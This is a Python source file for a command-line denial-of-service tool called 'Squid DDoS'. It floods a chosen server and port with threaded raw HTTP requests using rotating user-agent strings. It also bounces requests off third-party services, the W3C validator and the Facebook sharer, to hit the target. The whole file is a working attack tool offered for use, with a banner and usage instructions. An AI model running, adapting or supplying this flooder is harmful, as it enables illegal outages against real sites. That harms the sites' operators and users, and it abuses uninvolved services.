import urllib.request, random, socket, time, sys, threading, random, os
from queue import Queue
from optparse import OptionParser
def user_agent():
    global user_agents
    user_agents = ['Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                   'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.15',
                   'Mozilla/5.0 (AmigaOS; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14',
                   'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
                   'Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.1) Gecko/20061220 BonEcho/2.0.0.1',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.10) Gecko/20071128 BonEcho/2.0.0.10',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.17) Gecko/20080831 BonEcho/2.0.0.17',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.6) Gecko/20070731 BonEcho/2.0.0.6',
                   'Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7']
    return user_agents
def get_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)
def hammerbots(url):
    while True:
        req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agents)}))
        print("[+] Bots Have Sent a Request to the Server.")
        time.sleep(0.1)
def req_ddos():
    while True:
        try:
            item = q2.get()
            hammerbots(random.choice(bots) + "http://" + host)
            q2.task_done()
        except:
            pass
def sockddos():
    while True:
        try:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(user_agents) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet,(host, port)):
                s.shutdown(1)
                print("[+] Successfully sent a request to the server.")
            else:
                s.shutdown(1)
                print("[+] Unsuccessful request.")
            time.sleep(0.1)
        except:
            print("[+] Server May Be Down!")
def sock_ddos():
    while True:
        try:
            item = q.get()
            sockddos()
            q.task_done()
        except:
            pass
def usage():
    print("   _____             _     _   _____  _____        _____        __   ___ ")
    print("  / ____|           (_)   | | |  __ \|  __ \      / ____|      /_ | / _ \ ")
    print(" | (___   __ _ _   _ _  __| | | |  | | |  | | ___| (___   __   _| || | | |")
    print("  \___ \ / _` | | | | |/ _` | | |  | | |  | |/ _  \___ \  \ \ / / || | | |")
    print("  ____) | (_| | |_| | | (_| | | |__| | |__| | (_) |___) |  \ V /| || |_| |")
    print(" |_____/ \__, |\__,_|_|\__,_| |_____/|_____/ \___/_____/    \_/ |_(_)___/ ")
    print("            | |                                                           ")
    print("            |_|                                                           ")
    print(" Script By DrSquid")
    print("[+] -s : Server to Target")
    print("[+] -p : Port to Attack(default is 80).")
    print("[+] -t : Amount of Threads(default is 123).")
    print("[+] -i : Getting the list of commands(displays this).")
    print("[+] Usage: python3 Squid_DDoS.py -s [servername] -p [port] -t [threadcount]")
    sys.exit()
    quit()
with open('headers.txt', 'w') as headers:
    lines = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n', 'Accept-Language: en-us,en;q=0.5\n', 'Accept-Encoding: gzip,deflate\n', 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n', 'Keep-Alive: 115\n', 'Connection: keep-alive']
    headers.writelines(lines)
    headers.close()
with open('headers.txt','r') as headers:
    data = headers.read()
    headers.close()
q = Queue()
q2 = Queue()
def get_args():
    global host
    global port
    global thr
    global item
    args = OptionParser()
    args.add_option("-s","--server",dest="host",help="[+] Server to Target.",)
    args.add_option("-p","--port",dest="port",type="int",help="[+] Port to Attack(default is 80).")
    args.add_option("-t","--threads",dest="thr",type="int",help="[+] Amount of Threads(default is 123).")
    args.add_option('-i','--info',dest="cmds",help="[+] Help.",action='store_true')
    options, arguements = args.parse_args()
    if options.cmds:
        usage()
    if options.host is None:
        usage()
    else:
        host = options.host
    if options.port is None:
        port = 80
    else:
        port = options.port
    if options.thr is None:
        thr = 123
    else:
        thr = options.thr
if __name__ == '__main__':
    os.system('cls')
    if len(sys.argv) < 2:
        usage()
    get_args()
    get_bots()
    user_agent()
    print("   _____             _     _   _____  _____        _____        __   ___ ")
    print("  / ____|           (_)   | | |  __ \|  __ \      / ____|      /_ | / _ \ ")
    print(" | (___   __ _ _   _ _  __| | | |  | | |  | | ___| (___   __   _| || | | |")
    print("  \___ \ / _` | | | | |/ _` | | |  | | |  | |/ _  \___ \  \ \ / / || | | |")
    print("  ____) | (_| | |_| | | (_| | | |__| | |__| | (_) |___) |  \ V /| || |_| |")
    print(" |_____/ \__, |\__,_|_|\__,_| |_____/|_____/ \___/_____/    \_/ |_(_)___/ ")
    print("            | |                                                           ")
    print("            |_|                                                           ")
    print(" Script By DrSquid")
    print(f"[+] Target IP: {host}")
    print(f"[+] Port: {port}")
    print(f"[+] Threads: {thr}")
    try:
        hostip = socket.gethostbyname(host)
    except:
        print("[+] Check Server IP.")
        usage()
    while True:
        for i in range(thr):
            ddos = threading.Thread(target=sock_ddos)
            ddos.daemon = True
            ddos.start()
            ddos2 = threading.Thread(target=req_ddos)
            ddos2.daemon = True
            ddos2.start()
        start = time.time()
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(0.1)
            item += 1
            q.put(item)
            q2.put(item)
        q.join()
        q2.join()
else:
    print("[+] How did you get here?")
